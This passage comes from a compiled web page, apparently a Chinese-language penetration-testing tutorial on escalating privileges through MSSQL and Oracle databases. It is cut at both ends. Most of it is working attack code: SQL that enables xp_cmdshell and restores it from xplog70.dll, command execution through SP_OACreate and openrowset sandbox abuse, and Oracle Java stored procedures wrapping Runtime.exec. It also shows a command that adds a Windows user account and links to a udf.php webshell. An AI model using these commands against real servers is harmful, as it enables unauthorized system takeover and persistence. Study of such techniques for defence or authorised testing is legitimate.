udf.php：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php",target:"_blank"}),"https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php")," "),Object(s.b)("p",null,Object(s.b)("img",b({parentName:"p"},{src:"/images/image-20200521135047931.png",alt:null}))),Object(s.b)("h2",{className:"__internal",id:"mssql数据库提权"},"MSSQL数据库提权",Object(s.b)("a",b({parentName:"h2"},{href:"#mssql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"首先查看权限")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--是否sa权限，返回 1 就是sa"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," IS_SRVROLEMEMBER",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'sysadmin'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--是否dba权限，返回 1 就是DBA"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," IS_MEMBER",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'db_owner'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")))),Object(s.b)("h3",{className:"__internal",id:"一、xp_cmdshell"},"一、xp_cmdshell",Object(s.b)("a",b({parentName:"h3"},{href:"#%E4%B8%80%E3%80%81xp_cmdshell","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"适用(xp\\2000\\2003系统)")),Object(s.b)("p",{parentName:"blockquote"},"前提是MSSQL是以system用户运行的，才能提权；"),Object(s.b)("p",{parentName:"blockquote"},"如果用nt authority\\network service运行，是没有系统权限的。")),Object(s.b)("p",null,"默认情况下是关闭的，用下边的命令开启"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'show advanced options'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")," ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--允许修改高级参数"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'xp_cmdshell'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")," ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--打开xp_cmdshell扩展"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"如果xp_cmdshell被删除，可以尝试上传",Object(s.b)("inlineCode",{parentName:"p"},"xplog70.dll")," ",Object(s.b)("a",b({parentName:"p"},{href:"https://fix4dll.com/xplog70_dll",target:"_blank"}),"https://fix4dll.com/xplog70_dll")," 进行恢复，恢复语句："),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"Exec")," master",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"dbo",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"sp_addextendedproc ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'xp_cmdshell'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'c:\\\\xplog70.dll'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"然后执行命令"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"exec")," xp_cmdshell ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'whoami'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("h3",{className:"__internal",id:"二、sp_oacreate"},"二、SP_OACreate",Object(s.b)("a",b({parentName:"h3"},{href:"#%E4%BA%8C%E3%80%81sp_oacreate","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"适用(xp\\2000\\2003系统)"))),Object(s.b)("p",null,"当xp_cmdshell 删除以后，还可以使用SP_OACreate"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"首先要打开组件：")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--开启EXEC"),"\nsp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'show advanced options'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'Ole Automation Procedures'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--关闭EXEC"),"\nsp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'show advanced options'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"0"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'Ole Automation Procedures'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"0"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"之后使用以下语句执行命令：")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"declare")," ",Object(s.b)("span",b({parentName:"code"},{className:"token variable"}),"@shell")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"int")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"exec")," sp_oacreate ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'wscript.shell'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token variable"}),"@shell")," output ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"exec")," sp_oamethod ",Object(s.b)("span",b({parentName:"code"},{className:"token variable"}),"@shell"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'run'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token boolean"}),"null"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'c:\\windows\\system32\\cmd.exe /c whoami >c:\\\\1.txt'")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"这种方式是无回显的，打开1.txt查看命令执行结果")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"type")," c:",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),".txt"))),Object(s.b)("h3",{className:"__internal",id:"三、openrowset沙盒"},"三、openrowset沙盒",Object(s.b)("a",b({parentName:"h3"},{href:"#%E4%B8%89%E3%80%81openrowset%E6%B2%99%E7%9B%92","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"(2003系统可用、2012-r2实验失败)"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"首先检查cmd_shell是否开启")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"count"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," master",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"dbo",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"sysobjects ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"where")," xtype",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'x'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"and")," name",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'xp_cmdshell'"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--结果为 1 就是开启")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"第二步 开启默认关闭的xp_regwrite存储过程")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--开启"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," master",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"xp_regwrite ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'HKEY_LOCAL_MACHINE'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'SOFTWARE\\Microsoft\\Jet\\4.0\\Engines'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'SandBoxMode'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'REG_DWORD'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"0"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'show advanced options'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),"\nGO\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),"\nGO\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'Ad Hoc Distributed Queries'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),"\nGO\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RECONFIGURE"),"\nGO\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--利用完后恢复"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," master",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"xp_regwrite ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'HKEY_LOCAL_MACHINE'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'SOFTWARE\\Microsoft\\Jet\\4.0\\Engines'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'SandBoxMode'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'REG_DWORD'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'Ad Hoc Distributed Queries'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"0"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"reconfigure"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," sp_configure ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'show advanced options'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"0"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"reconfigure"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"利用jet.oledb执行系统命令")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"openrowset"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'microsoft.jet.oledb.4.0'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"';database=c:\\windows\\system32\\ias\\ias.mdb'")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'select shell(\"cmd.exe /c whoami > c:\\\\666.txt\")'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")))),Object(s.b)("p",null,"这个也是无回显的"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"沙盒模式SandBoxMode参数含义（默认是2）")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("inlineCode",{parentName:"p"},"0"),"：在任何所有者中禁止启用安全模式"),Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("inlineCode",{parentName:"p"},"1")," ：为仅在允许范围内"),Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("inlineCode",{parentName:"p"},"2")," ：必须在access模式下"),Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("inlineCode",{parentName:"p"},"3"),"：完全开启")),Object(s.b)("p",null,"openrowset是可以通过OLE DB访问SQL Server数据库"),Object(s.b)("p",null,"OLE DB是应用程序链接到SQL Server的的驱动程序"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"PowerUpSQL工具"),"：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/NetSPI/PowerUpSQL",target:"_blank"}),"https://github.com/NetSPI/PowerUpSQL")),Object(s.b)("h2",{className:"__internal",id:"oracle提权"},"Oracle提权",Object(s.b)("a",b({parentName:"h2"},{href:"#oracle%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"系统权限")),Object(s.b)("p",null,"系统规定用户使用数据库的权限（系统权限是对用户而言）"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"系统权限分类")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},"DBA："),"拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。\n",Object(s.b)("strong",{parentName:"p"},"RESOURCE："),"拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。\n",Object(s.b)("strong",{parentName:"p"},"CONNECT："),"拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。")),Object(s.b)("p",null,"对于普通用户：授予connect, resource权限。\n对于DBA管理用户：授予connect，resource, dba权限。"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"实体权限")),Object(s.b)("p",null,"某种权限用户对其它用户的表或视图的存取权限（是针对表或视图而言的）"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"实体权限分类")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"update"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"insert"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"alter"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"index"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"delete"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"all")," ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--all包括所有权限"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"execute")," ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--执行存储过程权限")))),Object(s.b)("h3",{className:"__internal",id:"一、存储过程提权"},"一、存储过程提权",Object(s.b)("a",b({parentName:"h3"},{href:"#%E4%B8%80%E3%80%81%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"当用户拥有创建存储过程权限时，则可以创建一个java class，然后用创建一个存储过程来进行调用 "),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"提权步骤")),Object(s.b)("p",null,"1、查看用户是否具有create procedure权限"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"SQL"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*")," form session_privs",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"2、 创建一个java class然后用procedure包装它进行调用 "),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"create")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"or")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"replace")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"and")," resolve java source named CMD ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"as"),"\n    ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"import")," java",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"lang",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"import")," java",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"io",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"public")," class CMD\n    {\n       ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"public")," static void execmd",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"String command",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," throws IOException \n\t\t{\n               Runtime",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"getRuntime",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"exec"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"command",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")," \n       \t} \n   \t}\n  \t",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"/")))),Object(s.b)("p",null,"3、 创建存储过程 "),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"create")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"or")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"replace")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"procedure")," CMDPROC",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"command ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"in")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"varchar"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"as")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"language")," java \n    name ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'CMD.execmd(java.lang.String)'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"/")))),Object(s.b)("p",null,"4、执行命令（添加一个系统管理员账户）"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"SQL"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXEC")," CMDPROC",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'net user winuser ha@Pass123 /add'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("h3",{className:"__internal",id:"二、利用java权限提权"},"二、利用java权限提权",Object(s.b)("a",b({parentName:"h3"},{href:"#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8java%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"1、先使用dba权限赋予用户java运行权限"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"SQL"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"grant")," JAVASYSPRIV ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"to")," system",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"2、创建jar包"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," dbms_xmlquery",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"newcontext",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," dual",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null," DUAL是Oracle与数据字典一起自动创建的一个表，它只有一列 